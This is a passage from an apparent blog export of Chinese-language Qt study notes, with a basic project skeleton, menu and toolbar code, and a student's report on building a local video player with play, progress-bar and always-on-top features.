    <url>/2019/08/31/Qt/Qt%E7%9A%84%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="main-cpp"><a href="#main-cpp" class="headerlink" title="main.cpp"></a>main.cpp</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;widget.h&quot;</span><br><span class="line">#include &lt;QApplication&gt;</span><br><span class="line">&#x2F;&#x2F;QApplication应用程序类</span><br><span class="line">&#x2F;&#x2F;Qt头文件没有.h</span><br><span class="line">&#x2F;&#x2F;头文件和类名一样</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;有且只有一个应用程序类对象</span><br><span class="line">    QApplication a(argc, argv);</span><br><span class="line">    &#x2F;&#x2F;MyWidget继承Qwidget，QWidget是一个窗口类对象</span><br><span class="line">    &#x2F;&#x2F;w是窗口</span><br><span class="line">    Widget w;</span><br><span class="line">    &#x2F;&#x2F;窗口创建默认是隐藏的，需要认为显示</span><br><span class="line">    w.show();</span><br><span class="line">    &#x2F;&#x2F;让程序一直执行，等待人为操作（等待事件的发生）</span><br><span class="line">    return a.exec();&#x2F;&#x2F;a是应用程序对象</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>##.pro</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#-------------------------------------------------</span><br><span class="line">#</span><br><span class="line"># Project created by QtCreator 2019-06-28T19:37:51</span><br><span class="line">#</span><br><span class="line">#-------------------------------------------------</span><br><span class="line"></span><br><span class="line">#项目文件用“#”注释</span><br><span class="line">#模块</span><br><span class="line">QT       +&#x3D; core gui</span><br><span class="line">#高于4版本添加QT+&#x3D;widgets，为了兼容4</span><br><span class="line">greaterThan(QT_MAJOR_VERSION, 4): QT +&#x3D; widgets</span><br><span class="line">#应用程序的名字</span><br><span class="line">TARGET &#x3D; untitled5</span><br><span class="line">#指定makefile的类型，app&#x2F;lib（库）</span><br><span class="line">TEMPLATE &#x3D; app</span><br><span class="line"></span><br><span class="line"># The following define makes your compiler emit warnings if you use</span><br><span class="line"># any feature of Qt which has been marked as deprecated (the exact warnings</span><br><span class="line"># depend on your compiler). Please consult the documentation of the</span><br><span class="line"># deprecated API in order to know how to port your code away from it.</span><br><span class="line">DEFINES +&#x3D; QT_DEPRECATED_WARNINGS</span><br><span class="line"></span><br><span class="line"># You can also make your code fail to compile if you use deprecated APIs.</span><br><span class="line"># In order to do so, uncomment the following line.</span><br><span class="line"># You can also select to disable deprecated APIs only up to a certain version of Qt.</span><br><span class="line">#DEFINES +&#x3D; QT_DISABLE_DEPRECATED_BEFORE&#x3D;0x060000    # disables all the APIs deprecated before Qt 6.0.0</span><br><span class="line"></span><br><span class="line">CONFIG +&#x3D; c++11</span><br><span class="line">#源文件.cpp</span><br><span class="line">SOURCES +&#x3D; \</span><br><span class="line">        main.cpp \</span><br><span class="line">        widget.cpp</span><br><span class="line">#头文件.h</span><br><span class="line">HEADERS +&#x3D; \</span><br><span class="line">        widget.h</span><br><span class="line"></span><br><span class="line"># Default rules for deployment.</span><br><span class="line">qnx: target.path &#x3D; &#x2F;tmp&#x2F;$$&#123;TARGET&#125;&#x2F;bin</span><br><span class="line">else: unix:!android: target.path &#x3D; &#x2F;opt&#x2F;$$&#123;TARGET&#125;&#x2F;bin</span><br><span class="line">!isEmpty(target.path): INSTALLS +&#x3D; target</span><br></pre></td></tr></table></figure>

<hr>
<p>##widget.h</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ifndef WIDGET_H</span><br><span class="line">#define WIDGET_H</span><br><span class="line"></span><br><span class="line">#include &lt;QWidget&gt;</span><br><span class="line"></span><br><span class="line">class Widget : public QWidget</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT&#x2F;&#x2F;信号与槽需要</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    Widget(QWidget *parent &#x3D; 0);</span><br><span class="line">    ~Widget();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">#endif &#x2F;&#x2F; WIDGET_H</span><br></pre></td></tr></table></figure>

<hr>
<p>##widget.cpp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;widget.h&quot;</span><br><span class="line"></span><br><span class="line">Widget::Widget(QWidget *parent)</span><br><span class="line">    : QWidget(parent)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Widget::~Widget()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
]]></content>
      <categories>
        <category>Qt</category>
      </categories>
      <tags>
        <tag>Qt</tag>
        <tag>大一</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt菜单栏和工具栏</title>
    <url>/2019/08/31/Qt/Qt%E8%8F%9C%E5%8D%95%E6%A0%8F%E5%92%8C%E5%B7%A5%E5%85%B7%E6%A0%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>信号是给槽函数传参的，信号函数只需声明，不需定义<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mainwindow.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;QmenuBar&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Qmenu&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QAction&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QtDebug&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QToolBar&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QStatusBar&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QLabel&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qlabel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QTextEdit&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDockWidget&gt;</span></span></span><br><span class="line"></span><br><span class="line">MainWindow::MainWindow(QWidget *parent)</span><br><span class="line">    : QMainWindow(parent)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//菜单栏</span></span><br><span class="line">    QMenuBar *mBar=<span class="keyword">new</span> QMenuBar(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//添加菜单</span></span><br><span class="line">    QMenu *pFile = mBar-&gt;addMenu(<span class="string">"文件"</span>);</span><br><span class="line">    <span class="comment">//添加菜单项，添加动作</span></span><br><span class="line">    QAction *pNew=pFile-&gt;addAction(<span class="string">"新建"</span>);</span><br><span class="line">    <span class="built_in">connect</span>(pNew,&amp;QAction::triggered,</span><br><span class="line">            [=]()</span><br><span class="line">    &#123;</span><br><span class="line">        qDebug(<span class="string">"push"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    pFile-&gt;addSeparator();<span class="comment">//添加分割线</span></span><br><span class="line">    QAction *popen=pFile-&gt;addAction(<span class="string">"打开"</span>);</span><br><span class="line">    <span class="comment">//工具栏，菜单上的快捷方式</span></span><br><span class="line">    QToolBar *toolbar=addToolBar(<span class="string">"toolbar"</span>);</span><br><span class="line">    <span class="comment">//工具栏添加快捷键</span></span><br><span class="line">    toolbar-&gt;addAction(pNew);</span><br><span class="line">    <span class="comment">//添加小控件</span></span><br><span class="line">    QPushButton *b=<span class="keyword">new</span> QPushButton(<span class="keyword">this</span>);</span><br><span class="line">    b-&gt;setText(<span class="string">"123"</span>);</span><br><span class="line">    toolbar-&gt;addWidget(b);</span><br><span class="line">    <span class="built_in">connect</span>(b,&amp;QPushButton::clicked,</span><br><span class="line">            [=]()</span><br><span class="line">    &#123;</span><br><span class="line">        b-&gt;setText(<span class="string">"345"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//状态栏</span></span><br><span class="line">    QStatusBar *sbar=<span class="keyword">new</span> QStatusBar(<span class="keyword">this</span>);</span><br><span class="line">    QLabel *label=<span class="keyword">new</span> QLabel(<span class="keyword">this</span>);</span><br><span class="line">    label-&gt;setText(<span class="string">"Normal text file"</span>);</span><br><span class="line">    sbar-&gt;addWidget(label);</span><br><span class="line">    <span class="comment">//addWidget 从左往右添加</span></span><br><span class="line">    sbar-&gt;addWidget(<span class="keyword">new</span> QLabel(<span class="string">"2"</span>,<span class="keyword">this</span>));</span><br><span class="line">    <span class="comment">//从右往左添加</span></span><br><span class="line">    sbar-&gt;addPermanentWidget(<span class="keyword">new</span> QLabel(<span class="string">"3"</span>,<span class="keyword">this</span>));</span><br><span class="line">    <span class="comment">//核心控件</span></span><br><span class="line">    QTextEdit *textEdit = <span class="keyword">new</span> QTextEdit(<span class="keyword">this</span>);</span><br><span class="line">    setCentralWidget(textEdit);</span><br><span class="line">    <span class="comment">//浮动窗口</span></span><br><span class="line">    QDockWidget *dock=<span class="keyword">new</span> QDockWidget(<span class="keyword">this</span>);</span><br><span class="line">    addDockWidget(Qt::RightDockWidgetArea,dock);</span><br><span class="line">    <span class="comment">//给浮动窗口添加控件</span></span><br><span class="line">    QTextEdit *textEdit1 = <span class="keyword">new</span> QTextEdit();</span><br><span class="line">    dock-&gt;setWidget(textEdit1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MainWindow::~MainWindow()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ul>
]]></content>
      <categories>
        <category>Qt</category>
      </categories>
      <tags>
        <tag>Qt</tag>
        <tag>大一</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt大作业：影音播放器</title>
    <url>/2019/08/31/Qt/Qt%E5%A4%A7%E4%BD%9C%E4%B8%9A%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="软件类别：本地视频文件播放器"><a href="#软件类别：本地视频文件播放器" class="headerlink" title="软件类别：本地视频文件播放器"></a>软件类别：本地视频文件播放器</h3><hr>
<h3 id="软件设计、实现的思路和方法："><a href="#软件设计、实现的思路和方法：" class="headerlink" title="软件设计、实现的思路和方法："></a>软件设计、实现的思路和方法：</h3><p>类名：player，继承自 QMainWindow<br>自定义类：video，继承自 QVideoWidget</p>
<hr>
<p>*注：</p>
<ul>
<li>播放部分格式文件需要安装解码器，安装包(LAVfilters)已打包一起发送</li>
<li>影音文件已打包发送，可直接用于软件测试</li>
</ul>
<hr>
<h3 id="主要功能和槽函数："><a href="#主要功能和槽函数：" class="headerlink" title="主要功能和槽函数："></a>主要功能和槽函数：</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> slots:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">openFile</span><span class="params">()</span></span>;<span class="comment">//打开文件</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fullScr</span><span class="params">()</span></span>;<span class="comment">//全屏</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">play_and_pause</span><span class="params">()</span></span>;<span class="comment">//播放和暂停</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">minimize</span><span class="params">()</span></span>;<span class="comment">//小窗置顶和取消</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">positionChanged</span><span class="params">(qint64 <span class="built_in">position</span>)</span></span>;<span class="comment">//进度条位置设置，随视频文件播放变化</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setPosition</span><span class="params">(qint64 <span class="built_in">position</span>)</span></span>;<span class="comment">//获取播放位置</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getDuration</span><span class="params">()</span></span>;<span class="comment">//获取视频文件长度</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">on_progress_sliderMoved</span><span class="params">(<span class="keyword">int</span> <span class="built_in">position</span>)</span></span>;<span class="comment">//进度条滑动改变视频进度</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">next_song</span><span class="params">()</span></span>;<span class="comment">//下一项</span></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="1、界面设计"><a href="#1、界面设计" class="headerlink" title="1、界面设计"></a>1、界面设计</h3><ul>
<li><p>ui-designer<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/8jzu6vx8s341wrlmmxetwjrj/image_1dfopk44sog1qmj1nve1kqb1k22f.png"  alt="image_1dfopk44sog1qmj1nve1kqb1k22f.png-244.9kB"></p>
</li>
<li><p>布局代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将widget设置为中心layout</span></span><br><span class="line">widget=<span class="keyword">new</span> QWidget;</span><br><span class="line"><span class="keyword">this</span>-&gt;setCentralWidget(widget);</span><br><span class="line"></span><br><span class="line"><span class="comment">//水平布局，控制按钮</span></span><br><span class="line">QBoxLayout *ctlLayout = <span class="keyword">new</span> QHBoxLayout;</span><br><span class="line">ctlLayout-&gt;addWidget(ui-&gt;<span class="built_in">open</span>);</span><br><span class="line">ctlLayout-&gt;addWidget(ui-&gt;playBtn);</span><br><span class="line">ctlLayout-&gt;addWidget(ui-&gt;next);</span><br><span class="line">ctlLayout-&gt;addWidget(ui-&gt;progress);</span><br><span class="line">ctlLayout-&gt;addWidget(ui-&gt;fullscreenBtn);</span><br><span class="line">ctlLayout-&gt;addWidget(ui-&gt;<span class="built_in">min</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调整水平布局部件比例</span></span><br><span class="line">ctlLayout-&gt;setStretchFactor(ui-&gt;playBtn,<span class="number">1</span>);</span><br><span class="line">ctlLayout-&gt;setStretchFactor(ui-&gt;progress,<span class="number">10</span>);</span><br><span class="line">ctlLayout-&gt;setStretchFactor(ui-&gt;fullscreenBtn,<span class="number">1</span>);</span><br><span class="line">ctlLayout-&gt;setStretchFactor(ui-&gt;<span class="built_in">min</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//垂直布局：视频播放器、水平控制布局</span></span><br><span class="line">QBoxLayout *mainLayout = <span class="keyword">new</span> QVBoxLayout;</span><br><span class="line">mainLayout-&gt;addWidget(videowidget);</span><br><span class="line">mainLayout-&gt;addLayout(ctlLayout);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置布局</span></span><br><span class="line">widget-&gt;setLayout(mainLayout);</span><br><span class="line"><span class="keyword">this</span>-&gt;setWindowTitle(<span class="string">"lxm的播放器"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置按钮透明</span></span><br><span class="line">ui-&gt;playBtn-&gt;setFlat(<span class="literal">true</span>);</span><br><span class="line">ui-&gt;<span class="built_in">open</span>-&gt;setFlat(<span class="literal">true</span>);</span><br><span class="line">ui-&gt;fullscreenBtn-&gt;setFlat(<span class="literal">true</span>);</span><br><span class="line">ui-&gt;<span class="built_in">min</span>-&gt;setFlat(<span class="literal">true</span>);</span><br><span class="line">ui-&gt;next-&gt;setFlat(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置图标</span></span><br><span class="line"><span class="comment">//所有图片均采用相对路径，并保存在资源文件下</span></span><br><span class="line">QIcon icon1;</span><br><span class="line">icon1.addFile(<span class="string">":/image/video_player_783px_1234870_easyicon.net.png"</span>);</span><br><span class="line">setWindowIcon(icon1);</span><br><span class="line"></span><br><span class="line">QIcon icon;</span><br><span class="line">icon.addFile(<span class="string">":/image/next_596px_1229355_easyicon.net.png"</span>);</span><br><span class="line">ui-&gt;playBtn-&gt;setIcon(icon);</span><br><span class="line"></span><br><span class="line">QIcon icon3;</span><br><span class="line">icon3.addFile(<span class="string">":/image/File_Box_808px_1145730_easyicon.net.png"</span>);</span><br><span class="line">ui-&gt;<span class="built_in">open</span>-&gt;setIcon(icon3);</span><br><span class="line"></span><br><span class="line">icon.addFile(<span class="string">":/image/fullscreen_128px_1181910_easyicon.net.png"</span>);</span><br><span class="line">ui-&gt;fullscreenBtn-&gt;setIcon(icon);</span><br><span class="line"></span><br><span class="line">QIcon icon2;</span><br><span class="line">icon2.addFile(<span class="string">":/image/button_arrow_up_200px_1189268_easyicon.net.png"</span>);</span><br><span class="line">ui-&gt;<span class="built_in">min</span>-&gt;setIcon(icon2);</span><br><span class="line"></span><br><span class="line">QIcon icon7;</span><br><span class="line">icon7.addFile(<span class="string">":/image/next_596px_1229354_easyicon.net.png"</span>);</span><br><span class="line">ui-&gt;next-&gt;setIcon(icon7);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置按钮文字提示</span></span><br><span class="line">ui-&gt;<span class="built_in">open</span>-&gt;setToolTip(tr(<span class="string">"打开文件"</span>));</span><br><span class="line">ui-&gt;playBtn-&gt;setToolTip(tr(<span class="string">"播放"</span>));</span><br><span class="line">ui-&gt;fullscreenBtn-&gt;setToolTip(tr(<span class="string">"全屏"</span>));</span><br><span class="line">ui-&gt;<span class="built_in">min</span>-&gt;setToolTip(tr(<span class="string">"小窗置顶"</span>));</span><br><span class="line">ui-&gt;next-&gt;setToolTip(tr(<span class="string">"下一项"</span>));</span><br></pre></td></tr></table></figure></li>
<li><p>软件界面：<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/m25a647uian6xkwohs4lxlm4/image_1dforeqmf115qdrq17auod71ioc19.png"  alt="image_1dforeqmf115qdrq17auod71ioc19.png-12.1kB"></p>
</li>
</ul>
<hr>
<h3 id="2、文件批量载入"><a href="#2、文件批量载入" class="headerlink" title="2、文件批量载入"></a>2、文件批量载入</h3><ul>
<li>信号和槽：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QObject::connect(ui-&gt;open,SIGNAL (clicked()),this,SLOT(openFile()));</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li><p>实现思路：<br>见代码注释</p>
</li>
<li><p>功能截图：<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/5rd55z0ja3fwwf96peo29j43/image_1dforgil91no4af2ut12tp18m11m.png"  alt="image_1dforgil91no4af2ut12tp18m11m.png-121.7kB"></p>
</li>
<li><p>实现方法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">player::openFile</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//打开工程文件所在文件夹，文件夹中放置了影音文件</span></span><br><span class="line">    <span class="comment">//list中存入文件名，使用QStringList和getOpenFileNames实现批量导入</span></span><br><span class="line">    QStringList <span class="built_in">list</span>=QFileDialog::getOpenFileNames(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="built_in">list</span>.<span class="built_in">size</span>();k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//path保存歌曲路径</span></span><br><span class="line">        QString path=QDir::toNativeSeparators(<span class="built_in">list</span>.at(k));</span><br><span class="line">        <span class="comment">//将该路径倒入到playlist中</span></span><br><span class="line">        playlist-&gt;addMedia(QUrl::fromLocalFile(path));</span><br><span class="line">        <span class="comment">//同路径中提取出文件名</span></span><br><span class="line">        QString name=path.split(<span class="string">"\\"</span>).last();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//导入后自动开始播放</span></span><br><span class="line">    <span class="keyword">if</span>(mediaplayer-&gt;state()!=<span class="number">1</span>)<span class="comment">//判断当前是否出于播放状态</span></span><br><span class="line">        play_and_pause();<span class="comment">//播放</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<h3 id="3、视频播放和暂停"><a href="#3、视频播放和暂停" class="headerlink" title="3、视频播放和暂停"></a>3、视频播放和暂停</h3><ul>
<li>信号和槽：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QObject::<span class="built_in">connect</span>(ui-&gt;playBtn,SIGNAL(clicked()),<span class="keyword">this</span>,SLOT(play_and_pause()));</span><br></pre></td></tr></table></figure></li>
<li>实现思路：<br>当视频为停止或暂停状态时，按钮play图标为“播放”，提示为“播放”,点击事件可以是视频变为播放状态;当视频为播放状态时，改变为暂停图标，按钮提示为“暂停”。</li>
<li>快捷键：空格</li>
<li>功能截图：<br>播放状态<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/ewq1yqvc5ratuqeblkt8tqv8/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%28145%29.png"  alt="屏幕截图(145).png-160.7kB"><br>暂停状态<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/ejyq27dwrygejumh7monwbsx/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%28146%29.png"  alt="屏幕截图(146).png-167.6kB"></li>
<li>实现方法：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">player::play_and_pause</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (mediaplayer-&gt;state()) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//playing</span></span><br><span class="line">    &#123;</span><br><span class="line">        QIcon icon;</span><br><span class="line">        icon.addFile(<span class="string">":/image/wedding_video_783px_1219421_easyicon.net.png"</span>);<span class="comment">//改变图标</span></span><br><span class="line">        ui-&gt;playBtn-&gt;setIcon(icon);</span><br><span class="line">        mediaplayer-&gt;pause();<span class="comment">//暂停播放</span></span><br><span class="line">        ui-&gt;playBtn-&gt;setToolTip(tr(<span class="string">"播放"</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>:<span class="comment">//stop&amp;paused</span></span><br><span class="line">    &#123;</span><br><span class="line">        QIcon icon;</span><br><span class="line">        icon.addFile(<span class="string">":/image/pause_button_195px_1197803_easyicon.net.png"</span>);</span><br><span class="line">        ui-&gt;playBtn-&gt;setIcon(icon);</span><br><span class="line">        mediaplayer-&gt;play();<span class="comment">//播放</span></span><br><span class="line">        ui-&gt;playBtn-&gt;setToolTip(tr(<span class="string">"暂停"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h3 id="4、进度条位置的调节"><a href="#4、进度条位置的调节" class="headerlink" title="4、进度条位置的调节"></a>4、进度条位置的调节</h3><ul>
<li>信号和槽：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QObject::<span class="built_in">connect</span>(mediaplayer,SIGNAL(positionChanged(qint64)),<span class="keyword">this</span>,SLOT(positionChanged(qint64)));</span><br><span class="line"></span><br><span class="line">QObject::<span class="built_in">connect</span>(mediaplayer,SIGNAL(durationChanged(qint64)),<span class="keyword">this</span>,SLOT(getDuration()));</span><br></pre></td></tr></table></figure></li>
<li>实现思路：<br>获取视频总时长和滑块可调节长度计算出换算比例，使滑块位置和视频播放位置相对应，具体见下方代码注释</li>
<li>实现方法：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">player::positionChanged</span><span class="params">(qint64 <span class="built_in">position</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//这里的position指的是视频的播放对应的时间</span></span><br><span class="line">    <span class="comment">//按照比例设置进度条位置</span></span><br><span class="line">    ui-&gt;progress-&gt;setValue(<span class="built_in">position</span>/time2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">player::setPosition</span><span class="params">(qint64 <span class="built_in">position</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取mediaplayer进度调整位置</span></span><br><span class="line">    mediaplayer-&gt;setPosition(<span class="built_in">position</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">player::on_progress_sliderMoved</span><span class="params">(<span class="keyword">int</span> <span class="built_in">position</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="comment">//position为滑块位置，position*time2为滑块位置应对应的视频时刻</span></span><br><span class="line">    setPosition(<span class="built_in">position</span>*time2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">player::getDuration</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取视频文件时间长度</span></span><br><span class="line">    time=mediaplayer-&gt;duration();</span><br><span class="line">    <span class="comment">//horizontalbar的长度为100，time2为比例系数</span></span><br><span class="line">    time2=(<span class="keyword">int</span>)time/<span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5、小窗置顶功能"><a href="#5、小窗置顶功能" class="headerlink" title="5、小窗置顶功能"></a>5、小窗置顶功能</h3></li>
<li>信号和槽：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QObject::<span class="built_in">connect</span>(ui-&gt;<span class="built_in">min</span>,SIGNAL(clicked()),<span class="keyword">this</span>,SLOT(minimize()));</span><br></pre></td></tr></table></figure></li>
<li>功能描述：<br>将该程序置顶于所有窗口,点击置顶按钮会提示“双击快捷操作”，使用双击方式置顶\取消置顶则不会提示，使使用更加流畅</li>
<li>功能截图：<ul>
<li>未置顶状态<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/2e2rrlyn0b98h3e6ipzt0wid/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%28148%29.png"  alt="屏幕截图(148).png-137.7kB"></li>
<li>置顶状态（可以在看视频的同时操作其它软件）<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/f9gd1eprdrrx23d1narjd0pj/image_1dforu1c91dpsg56191bni21vvj41.png"  alt="image_1dforu1c91dpsg56191bni21vvj41.png-414.2kB"></li>
</ul>
</li>
<li>实现方法：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//置顶功能</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">player::up</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m_flags == <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">//将播放器设置为置顶</span></span><br><span class="line">        m_flags = windowFlags();</span><br><span class="line">        setWindowFlags(m_flags | Qt::WindowStaysOnTopHint);</span><br><span class="line">        show();</span><br><span class="line">        <span class="comment">//变换图标和按钮提示</span></span><br><span class="line">        QIcon icon2;</span><br><span class="line">        icon2.addFile(<span class="string">":/image/down.png"</span>);</span><br><span class="line">        ui-&gt;<span class="built_in">min</span>-&gt;setIcon(icon2);</span><br><span class="line">        ui-&gt;<span class="built_in">min</span>-&gt;setToolTip(tr(<span class="string">"取消窗口置顶"</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">//取消播放器置顶</span></span><br><span class="line">        m_flags = <span class="literal">nullptr</span>;</span><br><span class="line">        setWindowFlags(m_flags);</span><br><span class="line">        show();</span><br><span class="line">        <span class="comment">//变换图标和按钮提示</span></span><br><span class="line">        QIcon icon2;</span><br><span class="line">        icon2.addFile(<span class="string">":/image/button_arrow_up_200px_1189268_easyicon.net.png"</span>);</span><br><span class="line">        ui-&gt;<span class="built_in">min</span>-&gt;setIcon(icon2);</span><br><span class="line">        ui-&gt;<span class="built_in">min</span>-&gt;setToolTip(tr(<span class="string">"小窗置顶"</span>));</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//槽函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">player::minimize</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QMessageBox::about(<span class="keyword">this</span>, tr(<span class="string">"Tips"</span>), tr(<span class="string">"双击进入/退出小窗"</span>));</span><br><span class="line">    up();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
